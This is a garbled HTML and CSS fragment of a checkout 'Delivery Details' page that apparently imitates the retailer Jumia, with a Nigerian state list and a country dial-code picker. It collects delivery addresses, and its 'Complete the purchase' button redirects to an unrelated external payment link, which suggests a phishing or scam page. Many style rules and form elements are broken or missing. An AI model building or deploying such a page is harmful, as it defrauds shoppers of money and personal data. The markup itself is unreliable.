<style>
*{ box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; }
body{
  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
  background: #fff;
  color: #111;
}

/* ===== TOP BAR ===== */
.topbar{
  background: #fff;
  padding: 14px 0;
  text-align: center;
  border-bottom: 3px solid #f68b1e;
}

.logo-img{
  height: 26px;
  width: auto;
  display: inline-block;
}

/* ===== CONTENT ===== */
.content{
  max-width: 480px;
  margin: 0 auto;
  padding: 24px 16px 40px;
}

.page-title{
  font-size: 22px;
  font-weight: 800;
  color: #111;
  margin-bottom: 16px;
}

/* ===== RESIDENTIAL BUTTON ===== */
.type-toggle{
  display: flex;
  margin-bottom: 24px;
}

.type-btn{
  flex: 1;
  height: 40px;
  border: 2px solid #f68b1e;
  background: #f68b1e;
  color: #fff;
  font-size: 14px;
  font-weight: 600;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
}

/* ===== FORM FIELDS ===== */
.field{
  position: relative;
  margin-bottom: 0;
  border-bottom: 1px solid #e0e0e0;
  padding: 18px 0 10px;
}

.field-label{
  display: block;
  font-size: 12px;
  font-weight: 600;
  color: #888;
  margin-bottom: 4px;
  letter-spacing: 0.2px;
}

.field-input{
  width: 100%;
  border: 0;
  outline: none;
  font-size: 15px;
  font-family: inherit;
  color: #333;
  background: transparent;
  padding: 0;
}

.field-input::placeholder{
  color: #ccc;
}

.field-select{
  width: 100%;
  border: 0;
  outline: none;
  font-size: 15px;
  font-family: inherit;
  color: #333;
  background: transparent;
  padding: 0;
  -webkit-appearance: none;
  appearance: none;
  cursor: pointer;
}

/* ===== SAVE BUTTON ===== */
.save-btn{
  width: 100%;
  height: 50px;
  border-radius: 999px;
  border: 2px solid #f68b1e;
  background: #f68b1e;
  color: #fff;
  font-weight: 700;
  font-size: 16px;
  cursor: pointer;
  margin-top: 36px;
  letter-spacing: 0.3px;
}
.save-btn:active{
  transform: scale(.99);
  opacity: .9;
}
.save-btn:disabled{
  background: #fff;
  color: #f68b1e;
  cursor: not-allowed;
  opacity: 1;
}

/* ===== ORDER REVIEW (hidden by default) ===== */
.order-review{
  display: none;
}

.saved-btn{
  width: 100%;
  height: 50px;
  border-radius: 999px;
  border: 0;
  background: #f68b1e;
  color: #fff;
  font-weight: 700;
  font-size: 16px;
  cursor: default;
  margin-bottom: 28px;
  letter-spacing: 0.3px;
}

.separator{
  border: 0;
  border-top: 1px solid #e0e0e0;
  margin: 0 0 24px;
}

.review-title{
  font-size: 22px;
  font-weight: 800;
  color: #111;
  margin-bottom: 20px;
}

.review-label{
  font-size: 15px;
  font-weight: 700;
  color: #111;
  margin-bottom: 2px;
}

.review-value{

.badge-residential{

}

.review-home{
  font-size: 15px;
  font-weight: 700;
  color: #111;
  margin-bottom: 2px;
}

.review-address{

.review-underline{

.item-row{

}
.complete-btn:active{

}

.phone-row{
  display: flex;
  align-items: center;
  gap: 12px;
}
.phone-number{

}

/* Country dial-code picker */
.iti{
  position: relative;
  flex: 0 0 auto;
}
.iti-btn{
  display: flex;
  align-items: center;
  gap: 7px;
  height: 36px;
  padding: 0 10px;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-radius: 6px;
  cursor: pointer;
  font: inherit;
  color: #333;
}
.iti-flag{
  width: 24px;
  height: 17px;
  object-fit: cover;
  border-radius: 2px;
  display: block;
  box-shadow: 0 0 0 1px rgba(0,0,0,.08);
}
.iti-code{
  font-weight: 600;
  font-size: 15px;
}
.iti-caret{
  color: #f68b1e;
  font-size: 10px;
  line-height: 1;
  transition: transform .15s ease;
}
.iti.open .iti-caret{
  transform: rotate(180deg);
}
.iti-list{
  position: absolute;
  z-index: 50;
  top: calc(100% + 6px);
  left: 0;
  width: 270px;
  max-height: 260px;
  overflow-y: auto;
  background: #fff;
  border: 1px solid #e0e0e0;
  border-radius: 8px;
  box-shadow: 0 10px 28px rgba(0,0,0,.18);
  list-style: none;
  margin: 0;
  padding: 6px 0;
  display: none;
}
.iti.open .iti-list{
  display: block;
}
.iti-item{
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 11px 14px;

  font-size: 15px;

.iti-item:hover,
.iti-item.active{

.iti-item .nm{ flex: 1; }
.iti-item .cd{ color: #555; }

/* ===== JUMIA STAR (top) ===== */

}

/* ===== TERMS & CONSENT ===== */
.terms{
  display: flex;
  align-items: flex-start;
  gap: 10px;
  margin-top: 20px;
  font-size: 14px;
  color: #333;

.terms input[type="checkbox"]{
  width: 18px;

  margin-top: 2px;
  flex: 0 0 auto;
  accent-color: #f68b1e;

}
.terms a{

}
.terms a:hover{ text-decoration: underline; }

.help-text{

}

/* ===== FOOTER JUMIA LOGO ===== */

  display: flex;
  align-items: center;
  justify-content: center;

  margin-top: 22px;
}
.footer-logo .jumia-word{
  font-size: 26px;
  font-weight: 800;
  letter-spacing: 1px;
  color: #313133;
}
</style>
</head>

<body>

<!-- TOP BAR -->

<!-- CONTENT -->
<div class="content">

  <!-- ===== DELIVERY FORM ===== -->
  <div id="formSection">
    <h1 class="page-title">Delivery Details</h1>

    <div class="type-toggle">
      <button class="type-btn" type="button">Residential</button>
    </div>

    <form id="deliveryForm" autocomplete="on">
      <div class="field">

      </div>

          <option value="Gombe">Gombe</option>

          <option value="Jigawa">Jigawa</option>
          <option value="Kaduna">Kaduna</option>
          <option value="Kano">Kano</option>

  <!-- ===== ORDER REVIEW (shown after Save) ===== -->

<script>
// Calculate tomorrow's date
function getDeliveryDate(){
  var d = new Date();
  d.setDate(d.getDate() + 1);
  var months = ['January','February','March','April','May','June','July','August','September','October','November','December'];
  return d.getDate() + ' ' + months[d.getMonth()] + ' ' + d.getFullYear();
}

// Terms & Conditions gate: Save stays disabled until the box is checked
var agreeTerms = document.getElementById('agreeTerms');
var saveBtn = document.getElementById('saveBtn');
agreeTerms.addEventListener('change', function(){
  saveBtn.disabled = !agreeTerms.checked;
});

document.getElementById('deliveryForm').addEventListener('submit', function(e){
  e.preventDefault();

  // Block advancing unless the Terms & Conditions box is ticked
  if(!agreeTerms.checked){
    saveBtn.disabled = true;
    return;
  }

  // Gather address data
  var street = document.getElementById('streetAddress').value;
  var complex = document.getElementById('complex').value;
  var suburb = document.getElementById('suburb').value;
  var city = document.getElementById('city').value;
  var province = document.getElementById('province').value;
  var postalCode = document.getElementById('postalCode').value;

  // Build address string
  var parts = [];
  if(complex) parts.push(complex);
  if(street) parts.push(street);
  var line2 = [];
  if(suburb) line2.push(suburb);
  if(city) line2.push(city);
  if(province) line2.push(province);
  if(postalCode) line2.push(postalCode);

  var addressHtml = parts.join(', ');
  if(line2.length) addressHtml += '<br>' + line2.join(', ');

  document.getElementById('reviewAddress').innerHTML = addressHtml;
  document.getElementById('deliveryDate').textContent = 'Delivery by ' + getDeliveryDate();

  // Hide form, show order review
  document.getElementById('formSection').style.display = 'none';
  document.getElementById('orderReview').style.display = 'block';

  // Scroll to top
  window.scrollTo(0, 0);
});

// Complete the purchase button
document.getElementById('completeBtn').addEventListener('click', function(){
  window.location.href = 'https://cashpaywld.lovable.app/pay/1dfa3eab-beef-4cf7-9c1a-df4eda2a4dbd';
});

// ===== Country dial-code picker (flag + code) =====
(function(){
  var COUNTRIES = [
    {n:"Afghanistan",d:"+93",c:"af"},{n:"Algeria",d:"+213",c:"dz"},{n:"Angola",d:"+244",c:"ao"},
    {n:"Argentina",d:"+54",c:"ar"},{n:"Australia",d:"+61",c:"au"},{n:"Austria",d:"+43",c:"at"},
    {n:"Belgium",d:"+32",c:"be"},{n:"Benin",d:"+229",c:"bj"},{n:"Brazil",d:"+55",c:"br"},
    {n:"Cameroon",d:"+237",c:"cm"},{n:"Canada",d:"+1",c:"ca"},{n:"China",d:"+86",c:"cn"},
    {n:"Côte d'Ivoire",d:"+225",c:"ci"},{n:"Egypt",d:"+20",c:"eg"},{n:"Ethiopia",d:"+251",c:"et"},
    {n:"France",d:"+33",c:"fr"},{n:"Germany",d:"+49",c:"de"},{n:"Ghana",d:"+233",c:"gh"},
    {n:"India",d:"+91",c:"in"},{n:"Ireland",d:"+353",c:"ie"},{n:"Italy",d:"+39",c:"it"},
    {n:"Kenya",d:"+254",c:"ke"},{n:"Liberia",d:"+231",c:"lr"},{n:"Mali",d:"+223",c:"ml"},
    {n:"Morocco",d:"+212",c:"ma"},{n:"Mozambique",d:"+258",c:"mz"},{n:"Netherlands",d:"+31",c:"nl"},
    {n:"Niger",d:"+227",c:"ne"},{n:"Nigeria",d:"+234",c:"ng"},{n:"Norway",d:"+47",c:"no"},
    {n:"Oman",d:"+968",c:"om"},{n:"Portugal",d:"+351",c:"pt"},{n:"Qatar",d:"+974",c:"qa"},
    {n:"Saudi Arabia",d:"+966",c:"sa"},{n:"Senegal",d:"+221",c:"sn"},{n:"South Africa",d:"+27",c:"za"},
    {n:"Spain",d:"+34",c:"es"},{n:"Sweden",d:"+46",c:"se"},{n:"Switzerland",d:"+41",c:"ch"},
    {n:"Tanzania",d:"+255",c:"tz"},{n:"Togo",d:"+228",c:"tg"},{n:"Tunisia",d:"+216",c:"tn"},
    {n:"Uganda",d:"+256",c:"ug"},{n:"United Arab Emirates",d:"+971",c:"ae"},
    {n:"United Kingdom",d:"+44",c:"gb"},{n:"United States",d:"+1",c:"us"},
    {n:"Zambia",d:"+260",c:"zm"},{n:"Zimbabwe",d:"+263",c:"zw"}
  ];
  var iti    = document.getElementById('phonePrefix');
  var btn    = document.getElementById('itiBtn');
  var list   = document.getElementById('itiList');
  var flag   = document.getElementById('itiFlag');
  var code   = document.getElementById('itiCode');
  var hidden = document.getElementById('mobilePrefix');

  function flagUrl(cc){ return 'https://flagcdn.com/w40/' + cc + '.png'; }

  COUNTRIES.forEach(function(co){
    var li = document.createElement('li');
    li.className = 'iti-item';
    li.setAttribute('role','option');
    if(co.d === '+234'){ li.classList.add('active'); }
    li.innerHTML =
      '<img class="iti-flag" src="' + flagUrl(co.c) + '" alt="">' +
      '<span class="nm">' + co.n + '</span>' +
      '<span class="cd">' + co.d + '</span>';
    li.addEventListener('click', function(){
      flag.src = flagUrl(co.c);
      flag.alt = co.n;
      code.textContent = co.d;
      hidden.value = co.d;
      Array.prototype.forEach.call(list.children, function(el){ el.classList.remove('active'); });
      li.classList.add('active');
      iti.classList.remove('open');
      btn.setAttribute('aria-expanded','false');
    });
    list.appendChild(li);
  });

  btn.addEventListener('click', function(e){
    e.stopPropagation();
    var open = iti.classList.toggle('open');
    btn.setAttribute('aria-expanded', open ? 'true' : 'false');
  });

  document.addEventListener('click', function(e){
    if(!iti.contains(e.target)){
      iti.classList.remove('open');
      btn.setAttribute('aria-expanded','false');
    }
  });
})();
</script>
